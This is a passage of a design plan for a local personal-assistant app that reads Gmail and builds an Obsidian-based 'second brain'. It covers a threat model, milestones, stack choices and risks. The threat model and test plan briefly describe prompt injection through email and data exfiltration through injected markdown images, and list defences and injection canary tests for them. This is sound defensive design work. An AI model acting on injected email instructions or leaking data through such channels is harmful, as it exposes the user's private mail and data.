| 008 | Docling for document conversion | `unpdf` + `mammoth` (Node), Claude PDF input | Python dependency (shared with the decider sidecar) |
| 009 | Python sidecar only for ML (decider, Docling) | All-TypeScript | Two runtimes, but TS stays the only app language |

---

## 5. Threat model

| Asset | Threat | Mitigation | Residual |
|---|---|---|---|
| Brain data | Prompt injection in email causes the agent to leak or act | Quarantined triage (no tools), enum-heavy schema, `trust` flag, chat agent has no outbound tools | Biased triage labels from crafted mail. **Low** |
| Brain data | Exfiltration through rendered markdown images or links | CSP `img-src 'self' data:`, DOMPurify, links shown as text | **Low** |
| Brain data | Exfiltration through Researcher search queries | Researcher deferred. Later: user-approved queries only | **Low** (none in v1) |
| Gmail accounts | Token theft leads to reading or sending all your mail | Tokens in Windows Credential Manager, only the mail-worker reads them, no send code path, BitLocker | Malware running as you. **Medium**, unavoidable locally |
| Gmail accounts | Accidental mass relabel or archive | Reversible ops only, dry-run diff shown before apply, per-refresh cap (e.g. 200), audit log | **Low** |
| Local API | CSRF or DNS rebinding from a browser tab | Host + Origin check, SameSite=Strict, CSRF token, auth | **Low** |
| 9router (if kept) | LAN exposure, default password, payload logs | Loopback bind, strong secrets, `REQUIRE_API_KEY`, logs off, firewall rule | **Low** |
| Anthropic account | Ban for ToS violation | Console API key (ADR-004) | **Negligible** |
| Prompt content | Provider retention, free providers training on data | Anthropic only for T1+, check retention terms | Data does leave the laptop. **Accepted** |
| T3 secrets | Ingested by accident (2FA codes, IBAN in invoices) | Ingestion-time detectors + redaction, eval cases for the detectors | Novel formats slip through. **Medium**, so add cases as you find them |
| Vault / git | Other people's data permanently in history | No raw mail in git, minimized items, private repo or no remote | **Low** |
| Backups | Stolen external disk | restic encryption, key in keychain plus a paper copy | **Low** |
| Audit log | Tampering hides actions | Append-only triggers + hash chain | Root-level attacker. **Accepted** |
| Supply chain | Malicious npm dependency, Obsidian community plugin | Lockfile, `pnpm audit`, few dependencies, no community plugins in the vault | **Medium** |
| Supply chain | Model weights (Laya, Docling OCR) with pickle/remote code | Pin model revisions by hash, safetensors/ONNX only, `trust_remote_code` off | **Low–Medium** |
| Laptop | Malicious PDF/DOCX exploits the parser | Docling in a subprocess with a timeout and no network, size limit, originals never executed | **Medium** (parser CVEs) |
| Sidecar | Another local process calls the decider | Bind to `127.0.0.1`, bearer key from the keychain, firewall rule | **Low** |
| Vault | The app overwrites your Obsidian edits | Hash check before every write. Mismatch → proposal, not overwrite | **Low** |

---

## 6. Phased plan

### Week 1: foundations you'll use every day

| Milestone | Acceptance test |
|---|---|
| Repos: `agentic-os` (code) and `vault` (data), never mixed | `git -C vault remote -v` is empty or points to a private remote, and the code repo has no `vault/` |
| `vault/CLAUDE.md`: taxonomy (8–10 areas), tiers, "never" rules, filing rules | Loaded as system rules. Changing the file changes behavior on the next request |
| Vault as an Obsidian vault: frontmatter schema, wikilinks, `attachments/`, minimal `.obsidian/` | Opens cleanly in Obsidian. A note edited there is re-indexed within 5 s. The app refuses to overwrite it |
| `llm.ts` + provider smoke test (§2b) | **Without a key:** the app boots and shows "Connect provider". **With a key:** all 6 smoke checks pass on the direct API. Switching `baseURL` in config passes checks 1–3 |
| `sidecar/` + `decider.ts` against `laya-serve` (CUDA) | Session area classification works offline. Median latency under 200 ms on the GPU. Low confidence escalates to Claude. `nvidia-smi` shows under 7 GB VRAM used |
| Chat UI (Vue): streaming, sessions in `brain.db` | Killing the server mid-stream keeps the partial message. 100 sessions list in under 100 ms |
| Session categorization at end of session (or after N turns) | 10 hand-written test chats file to the expected area in at least 9 of 10. A new area is *proposed*, never auto-created |
| Persona mode: 10 questions a day → `persona/*.md` via review | Answers show up as proposed items. Accepting one writes the file and commits it |
| Local API hardening (M9, M10) | Requests with a wrong `Host` or a foreign `Origin` get 403. An injected `<img src=http://…>` doesn't load |

### Month 1: the brain, plus one mailbox

| Milestone | Acceptance test |
|---|---|
| Derived index: chunks, FTS5, sqlite-vec, RRF | Retrieval eval (50 queries): recall@10 ≥ 0.8. `rebuild` reproduces the same top-5 for 20 queries |
| Extraction → `items` + review queue | Each item links to its source span. Rejected items never resurface |
| Gmail account #1, `gmail.readonly`, app In production | Refresh twice gives zero duplicate rows. A token still works on day 8 |
| Quarantined triage (decider → Claude cascade) + T3 redaction | 15 injection canary emails produce zero tool calls and are flagged. 20 T3 fixtures are 100% redacted. Claude is used for under 40% of mails after calibration |
| Document ingestion (Docling): PDF, DOCX, PPTX, MD, scanned PDF | 10 sample docs (EN/DE, 1 scanned, 1 with tables) convert successfully. Answers cite the page. Re-dropping the same file is a no-op |
| Refresh button: job queue + SSE progress | Closing the laptop mid-run, then Refresh again, resumes. Partial failure shows per-step errors |
| Daily brief (commitments due, important mail, open questions) | Generated in under 60 s and every line links to its source |
| Backups: `.backup` → restic to external disk | **Restore test**: restore to a temp dir, `PRAGMA integrity_check` = ok, the app boots on the restored copy |
| (Optional) MCP wrapper over brain tools | `search` works from Claude Code against the local DB |

### Month 3+: action and "acting like me"

| Milestone | Acceptance test |
|---|---|
| Accounts 2–4, incremental auth to `gmail.modify` | Each account syncs independently. One expired token doesn't block the others |
| Labels and archive (L3, reversible), with a dry-run diff | Golden set of 100 labelled emails: ≥ 90% correct. Undo works for the last run |
| Drafts → local `outbox/` first, Gmail Drafts (`compose`) later | Nothing is ever sent. The grep test for `messages.send` passes |
| Draft pipeline: persona + retrieval of 5 similar past sent emails | 30 edited drafts: median normalized edit distance falls month over month |
| Evals dashboard: suites × prompt version × model | Any prompt or model change triggers a run, and a regression over 3 pts blocks the switch |
| Weekly review: merges and splits, threshold recalibration | Precision at the auto-file threshold stays ≥ 95% |
| Laya fine-tune from your corrections (`decisions` where `corrected_by_user`) | After 300+ corrections, the fine-tuned checkpoint beats the base on a held-out set and the escalation rate drops. Otherwise keep the base |
| Study mode for ingested course material: question cards, tutor mode | Cards link to their source page. Tutor mode never gives the full answer before you try |

### "Acting like me": honest assessment

| Approach | Feasible? | Notes |
|---|---|---|
| Persona docs + retrieval of your past writing as examples | ✅ The core of it | Most of the gain comes from here |
| Preference memory from approvals, edits and rejections | ✅ | Store as `items(kind='preference')`, reviewed like everything else |
| Golden evals from your corrections | ✅ Essential | This is the "training" that actually works |
| LLM judge | ✅ For triage only | Calibrate against your decisions (agreement ≥ 85%), randomize order, use a rubric. Never the only gate |
| Automatic prompt optimization against your evals (DSPy-style) | ⚠️ Month 6+ | Worth it once you have 200+ cases |
| Fine-tuning frontier Claude models on your life | ❌ | Not offered for your setup, and it's the wrong lever anyway |
| Local LoRA on an open model | ⚠️ Hobby | Weak value per hour compared with retrieval + evals |

**Skill atrophy (MSc cybersecurity):** give each area a `mode`: `do`, `explain`, or `tutor`. Study areas default to `tutor`: Socratic hints, it asks for your attempt first, and it never writes the full solution unless you type `/solve`. Log the do-vs-tutor ratio in the weekly review.

---

## 7. Repository layout and tech

```
agentic-os/                 # code repo (can be public/private; contains no personal data)
  server/                   # Node 22 LTS, TypeScript, Fastify
    src/{api,agent,policy,jobs,mail,triage,extract,retrieval,embed,llm,vault}/
    test/                   # vitest; fixtures incl. injection canaries + T3 samples
  web/                      # Vue 3 + Vite + Pinia; DOMPurify; marked
  sidecar/                  # Python 3.12 via uv: laya-serve + docling; pinned model revisions
  scripts/                  # provider-smoke.ts, rebuild-index.ts, restore-test.ts
  pnpm-workspace.yaml
vault/                      # separate git repo — your data, a normal Obsidian vault
  CLAUDE.md  persona/  wiki/<area>/[sources/]  journal/  inbox/  outputs/  exports/*.jsonl
  attachments/              # originals (gitignored, restic-backed)
  .obsidian/                # minimal committed config
data/                       # NOT in any git repo
  brain.db  models/  backups/
```

| Concern | Choice | Why |
|---|---|---|
| Runtime | Node 22 LTS, TS strict | Your stack |
| HTTP | Fastify | Boring, schema-first |
| DB | `better-sqlite3` + `sqlite-vec` npm package | Synchronous, fast, prebuilt binaries for Windows |
| Validation | Zod, also used for LLM output schemas | One schema language |
| LLM | `@anthropic-ai/sdk` | See §2c |
| Gmail | `@googleapis/gmail` + `google-auth-library` | Smaller than the full `googleapis` package |
| Embeddings | `bge-m3` via sentence-transformers in the sidecar (CUDA fp16) | Uses your GPU, strong EN/DE/FA |
| Fast decisions | Laya multilingual via `laya-serve` (Apache-2.0) on CUDA; Kev-0.8B as the benchmark challenger | Local, Jev wire format |
| GPU runtime | PyTorch CUDA build for Turing (sm_75), fp16/fp32 only | The RTX 2070 has no bf16 |
| Documents | Docling CLI (MIT) | One tool for PDF, Office, OCR, tables |
| Vault I/O | `chokidar` (watch), `gray-matter` (frontmatter) | Small, boring |
| Python env | `uv` | One command to set up the sidecar on Windows |
| Secrets | `@napi-rs/keyring` | `keytar` is archived (⚠️ verify) |
| UI | Vue 3, Vite, Pinia | Your stack |
| Tests | Vitest unit tests; eval suites as a separate `pnpm eval` | Evals aren't unit tests, so keep them apart |
| Backup | restic (Windows build) + Task Scheduler on wake/logon | Native |

**Run locally:** `pnpm i` → `pnpm sidecar:setup` (runs `uv sync` and downloads pinned models once) → `pnpm dev`, which starts the server, web and sidecar together. Fastify serves the API and Vite on `127.0.0.1:5173/3000`. `pnpm eval`, `pnpm rebuild`, `pnpm restore-test`.

**Windows note:** keep `vault/` and `data/` **outside OneDrive** and other sync folders. Sync clients corrupt SQLite WAL files and fight git locks.

---

## 8. Risks you haven't mentioned

1. **Review-queue fatigue (the most likely way this project dies).** Every `propose_*` lands in a queue. If it grows faster than you review it, you stop trusting the system and then stop using it. *Mitigation:* a daily cap of 15 items, batch approve and reject, and auto-expire low-value proposals after 14 days.
2. **The Gmail password-change trap:** changing a Google password revokes refresh tokens that carry Gmail scopes. Refresh shows "re-connect account X" instead of failing silently.
3. **Embedding-model churn:** switching models means re-embedding everything. Use the version column and a background job.
4. **Model deprecation and silent drift:** prompts tuned on one model degrade on the next. Evals gate every model change.
5. **Prompt-cache invalidation:** if the persona prefix changes daily (journal snippets in it), caching never hits. Order the prompt from stable to volatile: rules → persona → retrieved → turn.
6. **The "second brain" cold start:** for the first weeks there's little to retrieve, so value comes from chat plus the daily brief. Optionally import your claude.ai export early.
7. **Maintenance budget:** the plan has many moving parts for one person. Every milestone above has to be useful on its own. If month 1 slips, the mail features slip, not the foundations.
8. **Other people's data in your daily brief:** a brief that profiles third parties ("Anna always replies late") goes beyond your obligations. Keep items about *your* commitments.

---

## 9. Pre-mortem (the-fool): "It's March 2027 and the project is dead. Why?"

| Failure story | Early warning | Prevention already in plan |
|---|---|---|
| Account banned, and the app is useless for a week while you rewire auth | Unusual 9router auth errors | ADR-004 (API key from day 1) |
| You stopped reviewing, and the brain filled with junk | Queue over 50 items, not opened in 3 days | Daily cap, expiry, batch actions |
| Auto-filing was wrong often enough that you stopped trusting it | Many manual re-files | Calibrated thresholds, flag band |
| Built 4 agents + MCP + evals before using it daily | Week 3 with no daily usage | Week-1 scope is chat only |
| An injected email made the system do something embarrassing | — | No outbound capability anywhere in v1 |

---

## 10. Clarifying questions

**All answered as of 2026-10-26, see §0.** Hardware was detected: RTX 2070 Max-Q 8 GB, 32 GB RAM.

<details><summary>Original questions (2026-10-25)</summary>


1. **Are you OK paying per token with a Console API key**, given the subscription route is out? If not, the alternative is a much smaller system around the official Claude Code CLI, which changes most of §4.
2. **Do you need access from your phone or another device?** Yes breaks "localhost only" and moves the Postgres trigger forward (e.g. Tailscale + auth).
3. **Do you want labels applied *in Gmail***, or is local categorization in the app enough? Local-only means you can stay on `gmail.readonly` forever, which is a much smaller blast radius.
4. **Mail volume and backfill depth:** roughly how many emails a day across 4 accounts, and how far back (90 days vs everything)? This sets cost and the triage model tier.
5. **How much Persian content do you expect?** It decides between e5-base and bge-m3 and whether you need a Persian FTS tokenizer.
6. **Will you actually use the brain from Claude Code or Desktop (MCP)**, or only from your own app? This decides whether the MCP wrapper lands in month 1 or never.
7. **Study material:** should PDFs, lecture slides and papers be ingested? That adds a document pipeline (PDF → text, citations) not yet in the plan.
8. **Is Obsidian a daily tool for you, or just "nice that it opens"?** If it's daily, vault structure and frontmatter conventions need more care (link format, no plugin dependencies).

</details>

---

*Next step: answer the questions (even partially), approve or amend the ADRs, and I'll turn Week 1 into an implementation plan (`/project:planning:create-implementation-plan`) before scaffolding.*

---

## Implementation Plan Adjustments

**Plan created:** 2026-10-26 · **Implementation plan:** [docs/week1/implementation-plan.md](week1/implementation-plan.md)

### Tickets added (beyond the §6 Week 1 milestones)
- **W1-02** SQLite foundation: the Week 1 features need sessions, approvals, audit and jobs tables before the Month 1 index exists.
- **W1-03** Secrets CLI: you add the API key yourself later, so you need a safe way to enter it.
- **W1-11** Review queue UI: category and persona proposals need a place to be approved. It was implied in §4 but had no Week 1 milestone.
- **W1-13** Verification and README.

### Scope moves
- The summary note's decisions, to-dos and facts are written as **Markdown sections** in Week 1. The `items` table and its review flow arrive in Month 1.
- Chat has **no tools** in Week 1. Brain tools come with the index in Month 1.
- `eval_cases` and `eval_runs` were moved forward to Week 1 (migration `0002`) for the categorization eval.

### New dependencies
- W1-10 is blocked by W1-09 (decider) and W1-08 (vault writer).
- W1-12 is blocked by W1-11 (approvals).
- Install `uv` (missing on this machine) before W1-09.
